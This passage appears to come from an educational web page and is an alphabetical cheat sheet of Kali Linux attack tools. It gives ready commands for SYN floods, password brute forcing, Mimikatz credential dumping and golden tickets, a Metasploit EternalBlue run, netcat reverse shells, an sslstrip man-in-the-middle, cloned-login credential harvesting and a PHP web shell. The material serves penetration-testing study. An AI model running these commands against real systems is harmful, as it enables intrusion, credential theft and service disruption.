# Category: Sniffing & Spoofing
# Purpose: Packet crafting, firewall testing

sudo apt install hping3

# Ping with custom packet:
sudo hping3 -1 192.168.1.1     # ICMP ping

# SYN flood (DoS test):
sudo hping3 -S --flood -p 80 192.168.1.1

# Port scan (SYN):
sudo hping3 -S -p 80 192.168.1.1

# Traceroute:
sudo hping3 --traceroute -S -p 80 192.168.1.1

# Firewall test:
sudo hping3 -S -p 80 192.168.1.1 -c 1

# ========== HYDRA ==========
# Category: Password Attacks
# Purpose: Brute force login services
# See Bonus Part 1 for detailed guide

sudo apt install hydra

# SSH brute force:
hydra -l admin -P passwords.txt ssh://192.168.1.100

# FTP:
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form:
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"

# RDP:
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# SMB:
hydra -l admin -P passwords.txt smb://192.168.1.100</div>

            <h3>I-J-K-Tools</h3>

            <div class=\"code\"># ========== IMPACKET ==========
# Category: Exploitation / Post Exploitation
# Purpose: Python scripts for Windows protocols

sudo apt install impacket-scripts

# Key scripts:

# psexec.py - Remote command execution:
psexec.py DOMAIN/user:password@192.168.1.100

# secretsdump.py - Dump hashes:
secretsdump.py DOMAIN/user:password@192.168.1.100

# GetNPUsers.py - AS-REP Roasting:
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.10

# GetUserSPNs.py - Kerberoasting:
GetUserSPNs.py -request DOMAIN/user:password -dc-ip 192.168.1.10

# smbexec.py - Execute via SMB:
smbexec.py DOMAIN/user:password@192.168.1.100

# wmiexec.py - Execute via WMI:
wmiexec.py DOMAIN/user:password@192.168.1.100

# ========== JOHN THE RIPPER ==========
# Category: Password Attacks
# Purpose: Password cracking (CPU-based)
# See Bonus Part 1 for detailed guide

sudo apt install john

# Crack password file:
john hashes.txt

# With wordlist:
john --wordlist=rockyou.txt hashes.txt

# Show cracked:
john --show hashes.txt

# Generate wordlist with rules:
john --wordlist=words.txt --rules --stdout > mangled.txt

# Crack specific format:
john --format=raw-md5 hashes.txt

# ========== KISMET ==========
# Category: Wireless Attacks
# Purpose: WiFi/Bluetooth monitoring
# See Section 5 for detailed guide

sudo apt install kismet

# Start:
sudo kismet

# Web UI: http://localhost:2501

# Features:
# - Detect hidden SSIDs
# - Track clients
# - GPS integration for wardriving
# - Bluetooth detection
# - Channel hopping</div>

            <h3>L-M-Tools</h3>

            <div class=\"code\"># ========== LEGION ==========
# Category: Information Gathering
# Purpose: Automated reconnaissance framework

sudo apt install legion

# Launch:
sudo legion

# Features:
# - Automatic port scanning (nmap)
# - Service enumeration
# - Vulnerability detection
# - Brute force attacks
# - Scheduled scans

# ========== MASSCAN ==========
# Category: Information Gathering
# Purpose: Ultra-fast port scanner (1 million packets/sec)

sudo apt install masscan

# Scan 10.0.0.0/8 (16 million IPs) in 5 minutes:
sudo masscan 10.0.0.0/8 -p80,443

# Scan all ports:
sudo masscan 192.168.1.0/24 -p0-65535

# Output to file:
sudo masscan 10.0.0.0/8 -p80 -oG output.txt

# Rate limit:
sudo masscan 10.0.0.0/8 -p80 --rate 10000

# ========== MEDUSA ==========
# Category: Password Attacks
# Purpose: Brute force (alternative to Hydra)

sudo apt install medusa

# SSH brute force:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# FTP:
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# HTTP:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# List modules:
medusa -d

# ========== METASPLOIT ==========
# Category: Exploitation Tools
# Purpose: Exploit framework
# See Bonus Part 1 for detailed guide

sudo msfconsole

# Search exploits:
msf6 > search type:exploit platform:windows smb

# Use exploit:
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Set options:
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10

# Run:
msf6 exploit(ms17_010_eternalblue) > run

# Meterpreter commands:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell

# ========== MIMIKATZ ==========
# Category: Post Exploitation
# Purpose: Extract Windows credentials

# Download:
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

# Usage (on Windows target):
mimikatz.exe

# Dump credentials:
mimikatz # sekurlsa::logonpasswords

# Pass-the-Hash:
mimikatz # sekurlsa::pth /user:admin /domain:company /ntlm:[HASH]

# Dump LSA secrets:
mimikatz # lsadump::secrets

# Golden Ticket:
mimikatz # kerberos::golden /user:admin /domain:company.com /sid:[SID] /krbtgt:[HASH] /ptt</div>

            <h3>N-O-Tools</h3>

            <div class=\"code\"># ========== NETCAT (NC) ==========
# Category: Sniffing & Spoofing / Post Exploitation
# Purpose: Swiss army knife of networking

# Pre-installed in Kali

# Listen for connection:
nc -lvnp 4444

# Connect to listener:
nc 192.168.1.10 4444

# Reverse shell (victim):
nc 192.168.1.10 4444 -e /bin/bash

# Bind shell (victim):
nc -lvnp 4444 -e /bin/bash

# Transfer file:
# Receiver:
nc -lvnp 4444 > file.txt
# Sender:
nc 192.168.1.10 4444 < file.txt

# Port scanning:
nc -zv 192.168.1.100 1-1000

# ========== NIKTO ==========
# Category: Web Application Analysis
# Purpose: Web server scanner (finds misconfigurations, outdated software)

sudo apt install nikto

# Basic scan:
nikto -h http://target.com

# Scan specific port:
nikto -h http://target.com -p 8080

# Save output:
nikto -h http://target.com -o report.html -Format html

# Use proxy (Burp):
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Tuning (specific checks):
nikto -h http://target.com -Tuning 1  # Interesting files
nikto -h http://target.com -Tuning 2  # Misconfiguration
nikto -h http://target.com -Tuning 3  # Information disclosure

# ========== NMAP ==========
# Category: Information Gathering
# Purpose: Network scanner (THE TOOL)

sudo apt install nmap

# Basic scan:
nmap 192.168.1.100

# Scan all ports:
nmap -p- 192.168.1.100

# Service version detection:
nmap -sV 192.168.1.100

# OS detection:
nmap -O 192.168.1.100

# Aggressive scan:
nmap -A 192.168.1.100

# Stealth scan (SYN):
sudo nmap -sS 192.168.1.100

# UDP scan:
sudo nmap -sU 192.168.1.100

# Script scan:
nmap --script vuln 192.168.1.100

# Output to file:
nmap 192.168.1.100 -oA results  # Creates .nmap, .xml, .gnmap

# ========== OPENVAS ==========
# See Greenbone/OpenVAS above

# ========== OWASP ZAP ==========
# Category: Web Application Analysis
# Purpose: Web proxy and scanner (OWASP project)

sudo apt install zaproxy

# Launch:
zaproxy

# Features:
# - Automated scanner
# - Spider/crawler
# - Fuzzer
# - Proxy
# - Active/passive scanning

# API mode:
zap.sh -daemon -port 8080 -config api.key=YOUR_KEY</div>

            <h3>P-Q-R-Tools</h3>

            <div class=\"code\"># ========== POWERSHELL EMPIRE (Starkiller) ==========
# Category: Post Exploitation
# Purpose: PowerShell C2 framework

# Install:
sudo apt install powershell-empire starkiller

# Start Empire server:
sudo powershell-empire server

# Start Starkiller GUI:
starkiller

# Web UI: https://localhost:1337
# Default: empireadmin / password123

# ========== PROXYCHAINS ==========
# Category: Post Exploitation
# Purpose: Force TCP connections through proxy (SOCKS4/5)

sudo apt install proxychains4

# Configure:
sudo nano /etc/proxychains4.conf

# Add at bottom:
socks5 127.0.0.1 1080

# Use:
proxychains nmap -sT 10.10.10.100
proxychains firefox
proxychains ssh user@10.10.10.100

# ========== RADARE2 ==========
# Category: Reverse Engineering
# Purpose: Command-line RE framework
# See Section 6 for detailed guide

sudo apt install radare2

# Open binary:
r2 binary

# Analyze:
[0x00000000]> aaa

# List functions:
[0x00000000]> afl

# Disassemble main:
[0x00000000]> pdf @main

# ========== REAVER ==========
# Category: Wireless Attacks
# Purpose: WPS PIN brute force

sudo apt install reaver

# Put interface in monitor mode:
sudo airmon-ng start wlan0

# Scan for WPS-enabled APs:
sudo wash -i wlan0mon

# Attack:
sudo reaver -i wlan0mon -b [AP_MAC] -vv

# Advanced:
sudo reaver -i wlan0mon -b [AP_MAC] -vv -d 15 -T 0.5 -c 6

# ========== RESPONDER ==========
# Category: Post Exploitation
# Purpose: LLMNR/NBT-NS/MDNS poisoning (capture NTLM hashes)

sudo apt install responder

# Start:
sudo responder -I eth0 -wv

# Flags:
# -I  ‚Üí Interface
# -w  ‚Üí Start WPAD rogue proxy
# -v  ‚Üí Verbose

# Captured hashes saved to:
# /usr/share/responder/logs/

# Crack with hashcat:
hashcat -m 5600 captured.txt rockyou.txt

# ========== ROUTERSPLOIT ==========
# Category: Exploitation Tools
# Purpose: Router exploitation framework

sudo apt install routersploit

# Launch:
rsf

# Search exploits:
rsf > search cisco

# Use exploit:
rsf > use exploits/routers/cisco/http_auth_bypass

# Set target:
rsf > set target 192.168.1.1

# Run:
rsf > run</div>

            <h3>S-Tools (Part 1)</h3>

            <div class=\"code\"># ========== SCAPY ==========
# Category: Sniffing & Spoofing
# Purpose: Packet manipulation library
# See Section 9 for detailed guide

sudo apt install python3-scapy

# Interactive:
sudo scapy

# Create packet:
>>> packet = IP(dst=\"192.168.1.1\")/ICMP()

# Send:
>>> send(packet)

# Send and receive:
>>> response = sr1(IP(dst=\"192.168.1.1\")/ICMP())

# ========== SET (Social Engineer Toolkit) ==========
# Category: Social Engineering
# Purpose: Social engineering attacks

sudo apt install set

# Launch:
sudo setoolkit

# Menu:
# 1. Social-Engineering Attacks
# 2. Website Attack Vectors
# 3. Credential Harvester
# 4. Clone target website
# 5. Enter target URL

# Creates fake login page
# Captures credentials when victim logs in

# ========== SKIPFISH ==========
# Category: Web Application Analysis
# Purpose: Active web application security scanner

sudo apt install skipfish

# Basic scan:
skipfish -o output/ http://target.com

# Authenticated scan (cookie):
skipfish -o output/ -C \"session=abc123\" http://target.com

# POST login:
skipfish -o output/ -A admin:password http://target.com

# ========== SLEUTHKIT ==========
# Category: Forensics
# Purpose: Filesystem analysis
# See Section 1 for detailed guide

sudo apt install sleuthkit

# List files:
fls disk.img

# Extract file:
icat disk.img [inode] > extracted_file

# Timeline:
fls -r -m / disk.img > timeline.csv

# ========== SQLMAP ==========
# Category: Database Assessment
# Purpose: Automated SQL injection
# See Bonus Part 1 for detailed guide

sudo apt install sqlmap

# Basic test:
sqlmap -u \"http://target.com/page.php?id=1\"

# POST:
sqlmap -u \"http://target.com/login.php\" --data=\"user=admin&pass=1\"

# Dump database:
sqlmap -u \"http://target.com/page.php?id=1\" --dbs
sqlmap -u \"http://target.com/page.php?id=1\" -D database --tables
sqlmap -u \"http://target.com/page.php?id=1\" -D database -T users --dump

# OS shell:
sqlmap -u \"http://target.com/page.php?id=1\" --os-shell

# ========== SSLSCAN ==========
# Category: Information Gathering
# Purpose: Test SSL/TLS configuration

sudo apt install sslscan

# Scan:
sslscan target.com

# Output shows:
# - Supported SSL/TLS versions
# - Cipher suites
# - Certificate details
# - Vulnerabilities (Heartbleed, POODLE, etc.)</div>

            <h3>S-Tools (Part 2)</h3>

            <div class=\"code\"># ========== SSLSTRIP ==========
# Category: Sniffing & Spoofing
# Purpose: Downgrade HTTPS to HTTP (MITM)

sudo apt install sslstrip

# With ARP spoofing:
# Terminal 1: Enable forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 2: ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 3: SSLstrip
sudo sslstrip -l 8080

# Terminal 4: Redirect traffic
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Captured credentials in sslstrip.log

# ========== SUBLIST3R ==========
# Category: Information Gathering
# Purpose: Subdomain enumeration

sudo apt install sublist3r

# Basic:
sublist3r -d company.com

# Save output:
sublist3r -d company.com -o subdomains.txt

# Enable brute force:
sublist3r -d company.com -b

# Specific search engines:
sublist3r -d company.com -e google,bing,yahoo</div>

            <h3>T-U-V-Tools</h3>

            <div class=\"code\"># ========== TCPDUMP ==========
# Category: Sniffing & Spoofing
# Purpose: Packet capture (CLI)

# Capture on interface:
sudo tcpdump -i eth0

# Save to file:
sudo tcpdump -i eth0 -w capture.pcap

# Filter:
sudo tcpdump -i eth0 port 80                # HTTP
sudo tcpdump -i eth0 host 192.168.1.100    # Specific host
sudo tcpdump -i eth0 'tcp[13] & 2 != 0'    # SYN packets

# Read pcap:
tcpdump -r capture.pcap

# ========== TESTSSL ==========
# Category: Information Gathering
# Purpose: Test SSL/TLS (more detailed than sslscan)

git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Run:
./testssl.sh target.com

# Checks:
# - Certificate validity
# - Heartbleed
# - CCS injection
# - Ticketbleed
# - ROBOT attack
# - Cipher strength
# - TLS version support

# ========== THEHARVESTER ==========
# See Section 11 for detailed guide

theHarvester -d company.com -b all

# ========== UNIX-PRIVESC-CHECK ==========
# Category: Post Exploitation
# Purpose: Find privilege escalation vectors (Linux)

# Download:
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check
chmod +x unix-privesc-check

# Run:
./unix-privesc-check standard
./unix-privesc-check detailed

# Checks:
# - SUID/SGID files
# - Writable config files
# - Weak file permissions
# - Cron jobs
# - Kernel exploits

# ========== VOLATILITY ==========
# Category: Forensics
# Purpose: Memory analysis
# See Section 1 for detailed guide

sudo apt install volatility3

# Identify profile:
vol.py -f memory.dump windows.info

# List processes:
vol.py -f memory.dump windows.pslist

# Dump process:
vol.py -f memory.dump windows.dumpfiles --pid 1234</div>

            <h3>W-X-Y-Z-Tools</h3>

            <div class=\"code\"># ========== WAFW00F ==========
# Category: Web Application Analysis
# Purpose: WAF (Web Application Firewall) detection

sudo apt install wafw00f

# Detect WAF:
wafw00f http://target.com

# Output:
# [*] The site http://target.com is behind Cloudflare (Cloudflare Inc.) WAF

# ========== WEEVELY ==========
# Category: Post Exploitation
# Purpose: Stealth PHP web shell

sudo apt install weevely

# Generate shell:
weevely generate password shell.php

# Upload shell.php to target

# Connect:
weevely http://target.com/shell.php password

# Commands:
weevely> :system.info          # System information
weevely> :file.download /etc/passwd local.txt
weevely> :audit.etcpasswd      # Check for weak passwords
weevely> :sql.console          # SQL shell

# ========== WHATWEB ==========
# Category: Information Gathering
# Purpose: Website fingerprinting

sudo apt install whatweb

# Basic:
whatweb target.com

# Verbose:
whatweb -v target.com

# Output shows:
# - CMS (WordPress, Joomla, etc.)
# - Web server
# - Programming language
# - JavaScript libraries
# - Analytics
# - CDN

# ========== WFUZZ ==========
# Category: Web Application Analysis
# Purpose: Web application fuzzer

sudo apt install wfuzz

# Fuzz parameter:
wfuzz -w wordlist.txt http://target.com/page.php?id=FUZZ

# Fuzz directory:
wfuzz -w wordlist.txt http://target.com/FUZZ

# POST:
wfuzz -w wordlist.txt -d \"user=admin&pass=FUZZ\" http://target.com/login.php

# Hide responses by size:
wfuzz -w wordlist.txt --hh 1234 http://target.com/FUZZ

# Hide by code:
wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ

# ========== WIRESHARK ==========
# Category: Sniffing & Spoofing
# Purpose: Packet analysis (GUI)
# See Bonus Part 1 for detailed guide

sudo apt install wireshark

# Launch:
sudo wireshark

# Capture:
# 1. Select interface (eth0)
# 2. Start capture
# 3. Apply filters (http, tcp.port == 80, etc.)
# 4. Follow TCP stream (right-click packet)
# 5. Extract objects (File ‚Üí Export Objects ‚Üí HTTP)

# ========== WPSCAN ==========
# Category: Web Application Analysis
# Purpose: WordPress vulnerability scanner

sudo apt install wpscan

# Basic scan:
wpscan --url http://target.com

# Enumerate users:
wpscan --url http://target.com --enumerate u

# Enumerate plugins:
wpscan --url http://target.com --enumerate p

# Enumerate themes:
wpscan --url http://target.com --enumerate t

# Brute force:
wpscan --url http://target.com --usernames admin --passwords rockyou.txt

# API token (for vulnerability data):
wpscan --url http://target.com --api-token YOUR_TOKEN

# ========== XSSTRIKE ==========
# Category: Web Application Analysis
# Purpose: XSS scanner and exploitation

git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Scan:
python3 xsstrike.py -u \"http://target.com/page.php?q=test\"

# Crawl entire site:
python3 xsstrike.py -u \"http://target.com\" --crawl

# Features:
# - Context analysis
# - WAF detection
# - Payload generation
# - DOM XSS detection

# ========== YARA ==========
# Category: Forensics / Malware Analysis
# Purpose: Pattern matching for malware identification

sudo apt install yara

# Create rule (malware.yar):
rule ExampleMalware
{
    strings:
        $a = \"malicious_string\"
        $b = { 6A 40 68 00 30 00 00 }  # Hex pattern
    condition:
        $a or $b
}

# Scan:
yara malware.yar /path/to/files

# Recursive:
yara -r malware.yar /path/to/directory

# ========== ZAPROXY ==========
# See OWASP ZAP above

# ========== ZENMAP ==========
# Category: Information Gathering
# Purpose: Nmap GUI

sudo apt install zenmap

# Launch:
sudo zenmap

# Features:
# - Visual network topology
# - Profile editor (save scan configs)
# - Compare scans
# - Search results
# - OS detection visualization

# ========== ZMAP ==========
# Category: Information Gathering
# Purpose: Internet-scale scanner (scan entire IPv4 in 45 minutes!)

sudo apt install zmap

# Scan Internet for web servers:
sudo zmap -p 80

# Specific network:
sudo zmap -p 443 10.0.0.0/8

# Output to file:
sudo zmap -p 22 -o results.txt

# Rate limit:
sudo zmap -p 80 -B 10M  # 10 Mbps

# Blocklist:
sudo zmap -p 80 -b blocklist.txt</div>

            <div class=\"metaphor-box\">
                <h4>üéâ You're a Kali Tools Encyclopedia!</h4>
                <p>You've mastered 100+ tools across ALL categories:<br><br>
                ‚úÖ <strong>Information Gathering:</strong> nmap, amass, recon-ng, Shodan, theHarvester<br>
                ‚úÖ <strong>Web App Analysis:</strong> Burp Suite, SQLmap, nikto, wpscan, gobuster, wfuzz<br>
                ‚úÖ <strong>Wireless:</strong> aircrack-ng, kismet, reaver, wifiphisher<br>
                ‚úÖ <strong>Password Attacks:</strong> hashcat, john, hydra, crunch<br>
                ‚úÖ <strong>Exploitation:</strong> Metasploit, exploitdb, impacket, BeEF<br>
                ‚úÖ <strong>Post-Exploitation:</strong> chisel, crackmapexec, mimikatz, responder<br>
                ‚úÖ <strong>Sniffing/Spoofing:</strong> Wireshark, tcpdump, bettercap, ettercap<br>
                ‚úÖ <strong>Reverse Engineering:</strong> radare2, ghidra, Binary Ninja<br>
                ‚úÖ <strong>Forensics:</strong> volatility, autopsy, binwalk, foremost<br>
                ‚úÖ <strong>Social Engineering:</strong> SET, gophish<br><br>
                <strong>Tool selection workflow:</strong><br>
                1. <strong>Recon phase:</strong> nmap ‚Üí enum4linux ‚Üí theHarvester ‚Üí Google dorking<br>
                2. <strong>Vulnerability discovery:</strong> nikto ‚Üí SQLmap ‚Üí Burp Suite<br>
                3. <strong>Exploitation:</strong> Metasploit ‚Üí exploit-db ‚Üí custom exploits<br>
                4. <strong>Post-exploitation:</strong> mimikatz ‚Üí bloodhound ‚Üí crackmapexec<br>
                5. <strong>Persistence:</strong> weevely ‚Üí empire ‚Üí custom C2<br><br>
                <strong>Quick reference cheat sheets:</strong><br>
                ‚Ä¢ <code>/usr/share/</code> - Default wordlists, scripts, tools<br>
                ‚Ä¢ <code>man [tool]</code> or <code>[tool] -h</code> - Help for any tool<br>
                ‚Ä¢ <strong>HackTricks:</strong> https://book.hacktricks.xyz (ultimate knowledge base)<br>
                ‚Ä¢ <strong>GTFOBins:</strong> https://gtfobins.github.io (Unix binary exploitation)<br>
                ‚Ä¢ <strong>LOLBAS:</strong> https://lolbas-project.github.io (Windows living off the land)<br>
                ‚Ä¢ <strong>PayloadsAllTheThings:</strong> https://github.com/swisskyrepo/PayloadsAllTheThings<br><br>
                <strong>Pro tips:</strong><br>
                ‚Ä¢ Always check <code>-h</code> flag first<br>
                ‚Ä¢ Read manual pages: <code>man nmap</code><br>
                ‚Ä¢ Practice in labs (HTB, TryHackMe) before real engagements<br>
                ‚Ä¢ Update tools regularly: <code>sudo apt update && sudo apt upgrade</code><br>
                ‚Ä¢ Keep notes in CherryTree or Obsidian for quick reference<br><br>
                You now have the most comprehensive Kali tools dictionary. Reference this during CTFs, exams, and real-world pentests! üõ†Ô∏èüî•</p>
            </div>
        </section>

    </main>

    <script>
        window.addEventListener('scroll', () => {
            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            const scrolled = (winScroll / height) * 100;
            document.getElementById('progress').style.width = scrolled + '%';
        });

        const sections = document.querySelectorAll('.section');
        const sidebarLinks = document.querySelectorAll('.sidebar-link');
        window.addEventListener('scroll', () => {
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.clientHeight;
                if (pageYOffset >= (sectionTop - 150)) {
                    current = section.getAttribute('id');
                }
            });
            sidebarLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${current}`) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>